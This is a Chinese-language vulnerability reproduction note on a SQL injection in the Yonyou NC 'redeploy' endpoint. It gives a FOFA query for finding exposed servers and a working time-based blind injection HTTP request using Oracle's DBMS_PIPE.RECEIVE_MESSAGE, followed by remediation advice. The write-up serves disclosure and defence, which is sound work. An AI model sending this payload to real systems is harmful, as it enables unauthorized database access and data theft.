# 漏洞复现 | 用友NC redeploy 存在SQL注入漏洞

## 漏洞信息

| 属性 | 值 |
|------|-----|
| 漏洞名称 | 用友NC redeploy SQL注入漏洞 |
| 漏洞类型 | SQL注入 |
| 组件 | 用友NC |
| 严重程度 | 高危 |

## 漏洞概述

用友NC redeploy接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句，利用`AND 1=DBMS_PIPE.RECEIVE_MESSAGE(1,2)`进行盲注，获取数据库敏感信息或进一步渗透。

## FOFA查询语法

```ini
app="用友-nc"
```

## 漏洞复现

### POC

**SQL盲注 payload**
```http
GET /portal/pt/M0dU1E/redeploy?id=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,2)--&pageId=login HTTP/1.1
Host: target
Cookie: JSESSIONID=xxx

```

**响应**：`延迟2秒返回` → 存在SQL注入

### 特征

- 注入点：`id` 参数
- 延时函数：`DBMS_PIPE.RECEIVE_MESSAGE(1,2)`（Oracle）
- 路径：`/portal/pt/{token}/redeploy`
- 特征：`pageId=login`

## 修复建议

1. 对用户输入进行严格过滤和参数化查询
2. 升级用友NC到最新安全版本
3. 限制接口访问权限
4. 部署Web应用防火墙

---

*来源：实战安全研究 | 原文链接：https://mp.weixin.qq.com/s/qY97aU5L_5Y9zYAdL5Kzzw*